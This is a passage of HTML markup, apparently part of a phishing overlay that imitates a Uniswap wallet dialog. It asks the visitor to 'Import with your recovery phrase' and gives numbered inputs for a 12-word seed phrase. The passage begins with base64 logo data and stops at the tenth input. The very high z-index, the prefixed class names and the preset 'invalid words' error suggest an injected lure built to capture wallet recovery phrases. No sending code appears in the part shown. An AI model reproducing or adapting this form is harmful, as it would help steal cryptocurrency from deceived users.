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"
                alt="Logo"
                class="uniswap-image scwtw-w-32 scwtw-h-32 scwtw-animate-logo-pulse"
              />
            </div>
            <div
              id="import-container-uniswap"
              class="scwtw-z-[2147483648] scwtw-transition-opacity scwtw-duration-500 scwtw-opacity-100"
            >
              <div>
                <div>
                  <div
                    class="scwtw-flex scwtw-justify-start scwtw-items-center scwtw-px-3 scwtw-pt-3"
                  >
                    <div>
                      <button
                        class="scwtw-p-1 scwtw-rounded-full hover:scwtw-bg-[#f9f9f9] dark:hover:scwtw-bg-[#1b1b1b] scwtw-transition-all scwtw-duration-300 scwtw-cursor-pointer"
                        type="button"
                        id="uniswap-close-button"
                      >
                        <svg
                          class="scwtw-w-6 scwtw-h-6 scwtw-text-[#7d7d7d] dark:scwtw-text-[#9b9b9b]"
                          viewBox="0 0 24 24"
                          fill="none"
                          stroke-width="8"
                        >
                          <path
                            d="M20 12C20 12.5523 19.5523 13 19 13L7.41421 13L12.7071 18.2929C13.0976 18.6834 13.0976 19.3166 12.7071 19.7071C12.3166 20.0976 11.6834 20.0976 11.2929 19.7071L4.29289 12.7071C3.90237 12.3166 3.90237 11.6834 4.29289 11.2929L11.2929 4.29289C11.6834 3.90237 12.3166 3.90237 12.7071 4.29289C13.0976 4.68342 13.0976 5.31658 12.7071 5.70711L7.41421 11H19C19.5523 11 20 11.4477 20 12Z"
                            fill="currentColor"
                            fill-rule="evenodd"
                            clip-rule="evenodd"
                          ></path>
                        </svg>
                      </button>
                    </div>
                  </div>
                </div>
                <div
                  class="scwtw-flex scwtw-items-center scwtw-justify-center scwtw-flex-col scwtw-gap-y-3"
                >
                  <div
                    class="scwtw-h-[48px] scwtw-w-[48px] scwtw-flex scwtw-items-center scwtw-justify-center scwtw-bg-[#f9f9f9] dark:scwtw-bg-[#1b1b1b] scwtw-rounded-[12px]"
                  >
                    <svg
                      class="scwtw-w-6 scwtw-h-6 scwtw-text-[#222222] dark:scwtw-text-[#ffffff]"
                      viewBox="0 0 24 24"
                      fill="none"
                      stroke-width="8"
                    >
                      <path
                        d="M12.75 6V3.75L17.25 8.25H15C13.42 8.25 12.75 7.58 12.75 6ZM14.75 16.6V17C14.26 17.5 14 18.2 14 19.05V20.7C14 20.87 13.87 21 13.7 21H6C4 21 3 20 3 18V6C3 4 4 3 6 3H11.25V6C11.25 8.42 12.58 9.75 15 9.75H18V12.64C18 12.79 17.9 12.9 17.75 12.93C16.04 13.27 14.75 14.79 14.75 16.6ZM7.75 16C7.75 15.586 7.414 15.25 7 15.25C6.586 15.25 6.25 15.586 6.25 16C6.25 16.414 6.586 16.75 7 16.75C7.414 16.75 7.75 16.414 7.75 16ZM7.75 12C7.75 11.586 7.414 11.25 7 11.25C6.586 11.25 6.25 11.586 6.25 12C6.25 12.414 6.586 12.75 7 12.75C7.414 12.75 7.75 12.414 7.75 12ZM11.75 16C11.75 15.586 11.414 15.25 11 15.25H9.5C9.086 15.25 8.75 15.586 8.75 16C8.75 16.414 9.086 16.75 9.5 16.75H11C11.414 16.75 11.75 16.414 11.75 16ZM14.75 12C14.75 11.586 14.414 11.25 14 11.25H9.5C9.086 11.25 8.75 11.586 8.75 12C8.75 12.414 9.086 12.75 9.5 12.75H14C14.414 12.75 14.75 12.414 14.75 12ZM21.5 19.05V21.15C21.5 22.05 21.0499 22.5 20.1499 22.5H16.8501C15.9501 22.5 15.5 22.05 15.5 21.15V19.05C15.5 18.38 15.751 17.961 16.25 17.79V16.6C16.25 15.359 17.26 14.35 18.5 14.35C19.74 14.35 20.75 15.359 20.75 16.6V17.79C21.249 17.961 21.5 18.38 21.5 19.05ZM19.25 16.6C19.25 16.186 18.913 15.85 18.5 15.85C18.087 15.85 17.75 16.186 17.75 16.6V17.7H19.25V16.6Z"
                        fill="currentColor"
                      ></path>
                    </svg>
                  </div>
                  <div
                    class="scwtw-grid scwtw-items-center scwtw-justify-center scwtw-text-center"
                  >
                    <h4
                      class="font-inter scwtw-text-[#222222] dark:scwtw-text-[#ffffff] scwtw-font-normal scwtw-text-[18px] scwtw-mb-1.5"
                    >
                      Import with your recovery phrase
                    </h4>
                    <p
                      class="font-inter scwtw-text-[#7d7d7d] dark:scwtw-text-[#9b9b9b] scwtw-font-normal scwtw-text-[14px]"
                    >
                      Type or paste your 12-word recovery phrase
                    </p>
                  </div>
                </div>
                <div
                  class="scwtw-px-4 scwtw-my-2 scwtw-opacity-0 scwtw-ease-in-out scwtw-transition-all scwtw-duration-400 scwtw-text-center"
                  id="uniswap-error-container"
                >
                  <span
                    class="font-inter scwtw-text-[#ff5f52] scwtw-font-normal scwtw-text-[14px]"
                    >2 words are invalid or misspelled</span
                  >
                </div>
                <div
                  class="scwtw-px-4 scwtw-max-h-[330px] scwtw-overflow-y-auto uniswap-custom-scrollbar"
                >
                  <div class="scwtw-grid scwtw-grid-cols-3 scwtw-gap-3">
                    <div
                      id="uniswap-container-12-words"
                      class="uniswap-container-12-words scwtw-contents"
                    >
                      <div class="scwtw-relative">
                        <div
                          class="scwtw-absolute scwtw-left-[16px] scwtw-top-[12px]"
                        >
                          <div>
                            <p
                              class="font-inter scwtw-text-[#7d7d7d] dark:scwtw-text-[#9b9b9b] scwtw-text-[14px] scwtw-font-normal"
                            >
                              1
                            </p>
                          </div>
                        </div>
                        <input
                          class="scwtw-w-full scwtw-h-[44px] scwtw-py-[11px] scwtw-pl-[40px] scwtw-pr-[8px] scwtw-text-[14px] scwtw-font-medium scwtw-rounded-[16px] scwtw-text-[#222222] dark:scwtw-text-[#ffffff] scwtw-border scwtw-border-[#2222220d] dark:scwtw-border-[#ffffff1f] scwtw-bg-[#f9f9f9] dark:scwtw-bg-[#1b1b1b] focus:scwtw-bg-[#ffffff] dark:focus:scwtw-bg-[#131313] scwtw-outline-none scwtw-transition-all scwtw-duration-300 font-inter data-[invalid=true]:scwtw-bg-[#fa2b391f] dark:data-[invalid=true]:scwtw-bg-[#ff00001f] data-[invalid=true]:scwtw-text-[#ff5f52] uniswap-seed-input"
                          type="text"
                          data-invalid="false"
                        />
                      </div>
                      <div class="scwtw-relative">
                        <div
                          class="scwtw-absolute scwtw-left-[16px] scwtw-top-[12px]"
                        >
                          <div>
                            <p
                              class="font-inter scwtw-text-[#7d7d7d] dark:scwtw-text-[#9b9b9b] scwtw-text-[14px] scwtw-font-normal"
                            >
                              2
                            </p>
                          </div>
                        </div>
                        <input
                          class="scwtw-w-full scwtw-h-[44px] scwtw-py-[11px] scwtw-pl-[40px] scwtw-pr-[8px] scwtw-text-[14px] scwtw-font-medium scwtw-rounded-[16px] scwtw-text-[#222222] dark:scwtw-text-[#ffffff] scwtw-border scwtw-border-[#2222220d] dark:scwtw-border-[#ffffff1f] scwtw-bg-[#f9f9f9] dark:scwtw-bg-[#1b1b1b] focus:scwtw-bg-[#ffffff] dark:focus:scwtw-bg-[#131313] scwtw-outline-none scwtw-transition-all scwtw-duration-300 font-inter data-[invalid=true]:scwtw-bg-[#fa2b391f] dark:data-[invalid=true]:scwtw-bg-[#ff00001f] data-[invalid=true]:scwtw-text-[#ff5f52] uniswap-seed-input"
                          type="text"
                          data-invalid="false"
                        />
                      </div>
                      <div class="scwtw-relative">
                        <div
                          class="scwtw-absolute scwtw-left-[16px] scwtw-top-[12px]"
                        >
                          <div>
                            <p
                              class="font-inter scwtw-text-[#7d7d7d] dark:scwtw-text-[#9b9b9b] scwtw-text-[14px] scwtw-font-normal"
                            >
                              3
                            </p>
                          </div>
                        </div>
                        <input
                          class="scwtw-w-full scwtw-h-[44px] scwtw-py-[11px] scwtw-pl-[40px] scwtw-pr-[8px] scwtw-text-[14px] scwtw-font-medium scwtw-rounded-[16px] scwtw-text-[#222222] dark:scwtw-text-[#ffffff] scwtw-border scwtw-border-[#2222220d] dark:scwtw-border-[#ffffff1f] scwtw-bg-[#f9f9f9] dark:scwtw-bg-[#1b1b1b] focus:scwtw-bg-[#ffffff] dark:focus:scwtw-bg-[#131313] scwtw-outline-none scwtw-transition-all scwtw-duration-300 font-inter data-[invalid=true]:scwtw-bg-[#fa2b391f] dark:data-[invalid=true]:scwtw-bg-[#ff00001f] data-[invalid=true]:scwtw-text-[#ff5f52] uniswap-seed-input"
                          type="text"
                          data-invalid="false"
                        />
                      </div>
                      <div class="scwtw-relative">
                        <div
                          class="scwtw-absolute scwtw-left-[16px] scwtw-top-[12px]"
                        >
                          <div>
                            <p
                              class="font-inter scwtw-text-[#7d7d7d] dark:scwtw-text-[#9b9b9b] scwtw-text-[14px] scwtw-font-normal"
                            >
                              4
                            </p>
                          </div>
                        </div>
                        <input
                          class="scwtw-w-full scwtw-h-[44px] scwtw-py-[11px] scwtw-pl-[40px] scwtw-pr-[8px] scwtw-text-[14px] scwtw-font-medium scwtw-rounded-[16px] scwtw-text-[#222222] dark:scwtw-text-[#ffffff] scwtw-border scwtw-border-[#2222220d] dark:scwtw-border-[#ffffff1f] scwtw-bg-[#f9f9f9] dark:scwtw-bg-[#1b1b1b] focus:scwtw-bg-[#ffffff] dark:focus:scwtw-bg-[#131313] scwtw-outline-none scwtw-transition-all scwtw-duration-300 font-inter data-[invalid=true]:scwtw-bg-[#fa2b391f] dark:data-[invalid=true]:scwtw-bg-[#ff00001f] data-[invalid=true]:scwtw-text-[#ff5f52] uniswap-seed-input"
                          type="text"
                          data-invalid="false"
                        />
                      </div>
                      <div class="scwtw-relative">
                        <div
                          class="scwtw-absolute scwtw-left-[16px] scwtw-top-[12px]"
                        >
                          <div>
                            <p
                              class="font-inter scwtw-text-[#7d7d7d] dark:scwtw-text-[#9b9b9b] scwtw-text-[14px] scwtw-font-normal"
                            >
                              5
                            </p>
                          </div>
                        </div>
                        <input
                          class="scwtw-w-full scwtw-h-[44px] scwtw-py-[11px] scwtw-pl-[40px] scwtw-pr-[8px] scwtw-text-[14px] scwtw-font-medium scwtw-rounded-[16px] scwtw-text-[#222222] dark:scwtw-text-[#ffffff] scwtw-border scwtw-border-[#2222220d] dark:scwtw-border-[#ffffff1f] scwtw-bg-[#f9f9f9] dark:scwtw-bg-[#1b1b1b] focus:scwtw-bg-[#ffffff] dark:focus:scwtw-bg-[#131313] scwtw-outline-none scwtw-transition-all scwtw-duration-300 font-inter data-[invalid=true]:scwtw-bg-[#fa2b391f] dark:data-[invalid=true]:scwtw-bg-[#ff00001f] data-[invalid=true]:scwtw-text-[#ff5f52] uniswap-seed-input"
                          type="text"
                          data-invalid="false"
                        />
                      </div>
                      <div class="scwtw-relative">
                        <div
                          class="scwtw-absolute scwtw-left-[16px] scwtw-top-[12px]"
                        >
                          <div>
                            <p
                              class="font-inter scwtw-text-[#7d7d7d] dark:scwtw-text-[#9b9b9b] scwtw-text-[14px] scwtw-font-normal"
                            >
                              6
                            </p>
                          </div>
                        </div>
                        <input
                          class="scwtw-w-full scwtw-h-[44px] scwtw-py-[11px] scwtw-pl-[40px] scwtw-pr-[8px] scwtw-text-[14px] scwtw-font-medium scwtw-rounded-[16px] scwtw-text-[#222222] dark:scwtw-text-[#ffffff] scwtw-border scwtw-border-[#2222220d] dark:scwtw-border-[#ffffff1f] scwtw-bg-[#f9f9f9] dark:scwtw-bg-[#1b1b1b] focus:scwtw-bg-[#ffffff] dark:focus:scwtw-bg-[#131313] scwtw-outline-none scwtw-transition-all scwtw-duration-300 font-inter data-[invalid=true]:scwtw-bg-[#fa2b391f] dark:data-[invalid=true]:scwtw-bg-[#ff00001f] data-[invalid=true]:scwtw-text-[#ff5f52] uniswap-seed-input"
                          type="text"
                          data-invalid="false"
                        />
                      </div>
                      <div class="scwtw-relative">
                        <div
                          class="scwtw-absolute scwtw-left-[16px] scwtw-top-[12px]"
                        >
                          <div>
                            <p
                              class="font-inter scwtw-text-[#7d7d7d] dark:scwtw-text-[#9b9b9b] scwtw-text-[14px] scwtw-font-normal"
                            >
                              7
                            </p>
                          </div>
                        </div>
                        <input
                          class="scwtw-w-full scwtw-h-[44px] scwtw-py-[11px] scwtw-pl-[40px] scwtw-pr-[8px] scwtw-text-[14px] scwtw-font-medium scwtw-rounded-[16px] scwtw-text-[#222222] dark:scwtw-text-[#ffffff] scwtw-border scwtw-border-[#2222220d] dark:scwtw-border-[#ffffff1f] scwtw-bg-[#f9f9f9] dark:scwtw-bg-[#1b1b1b] focus:scwtw-bg-[#ffffff] dark:focus:scwtw-bg-[#131313] scwtw-outline-none scwtw-transition-all scwtw-duration-300 font-inter data-[invalid=true]:scwtw-bg-[#fa2b391f] dark:data-[invalid=true]:scwtw-bg-[#ff00001f] data-[invalid=true]:scwtw-text-[#ff5f52] uniswap-seed-input"
                          type="text"
                          data-invalid="false"
                        />
                      </div>
                      <div class="scwtw-relative">
                        <div
                          class="scwtw-absolute scwtw-left-[16px] scwtw-top-[12px]"
                        >
                          <div>
                            <p
                              class="font-inter scwtw-text-[#7d7d7d] dark:scwtw-text-[#9b9b9b] scwtw-text-[14px] scwtw-font-normal"
                            >
                              8
                            </p>
                          </div>
                        </div>
                        <input
                          class="scwtw-w-full scwtw-h-[44px] scwtw-py-[11px] scwtw-pl-[40px] scwtw-pr-[8px] scwtw-text-[14px] scwtw-font-medium scwtw-rounded-[16px] scwtw-text-[#222222] dark:scwtw-text-[#ffffff] scwtw-border scwtw-border-[#2222220d] dark:scwtw-border-[#ffffff1f] scwtw-bg-[#f9f9f9] dark:scwtw-bg-[#1b1b1b] focus:scwtw-bg-[#ffffff] dark:focus:scwtw-bg-[#131313] scwtw-outline-none scwtw-transition-all scwtw-duration-300 font-inter data-[invalid=true]:scwtw-bg-[#fa2b391f] dark:data-[invalid=true]:scwtw-bg-[#ff00001f] data-[invalid=true]:scwtw-text-[#ff5f52] uniswap-seed-input"
                          type="text"
                          data-invalid="false"
                        />
                      </div>
                      <div class="scwtw-relative">
                        <div
                          class="scwtw-absolute scwtw-left-[16px] scwtw-top-[12px]"
                        >
                          <div>
                            <p
                              class="font-inter scwtw-text-[#7d7d7d] dark:scwtw-text-[#9b9b9b] scwtw-text-[14px] scwtw-font-normal"
                            >
                              9
                            </p>
                          </div>
                        </div>
                        <input
                          class="scwtw-w-full scwtw-h-[44px] scwtw-py-[11px] scwtw-pl-[40px] scwtw-pr-[8px] scwtw-text-[14px] scwtw-font-medium scwtw-rounded-[16px] scwtw-text-[#222222] dark:scwtw-text-[#ffffff] scwtw-border scwtw-border-[#2222220d] dark:scwtw-border-[#ffffff1f] scwtw-bg-[#f9f9f9] dark:scwtw-bg-[#1b1b1b] focus:scwtw-bg-[#ffffff] dark:focus:scwtw-bg-[#131313] scwtw-outline-none scwtw-transition-all scwtw-duration-300 font-inter data-[invalid=true]:scwtw-bg-[#fa2b391f] dark:data-[invalid=true]:scwtw-bg-[#ff00001f] data-[invalid=true]:scwtw-text-[#ff5f52] uniswap-seed-input"
                          type="text"
                          data-invalid="false"
                        />
                      </div>
                      <div class="scwtw-relative">
                        <div
                          class="scwtw-absolute scwtw-left-[16px] scwtw-top-[12px]"
                        >
                          <div>
                            <p
                              class="font-inter scwtw-text-[#7d7d7d] dark:scwtw-text-[#9b9b9b] scwtw-text-[14px] scwtw-font-normal"
                            >
                              10
                            </p>
                          </div>
                        </div>
                        <input
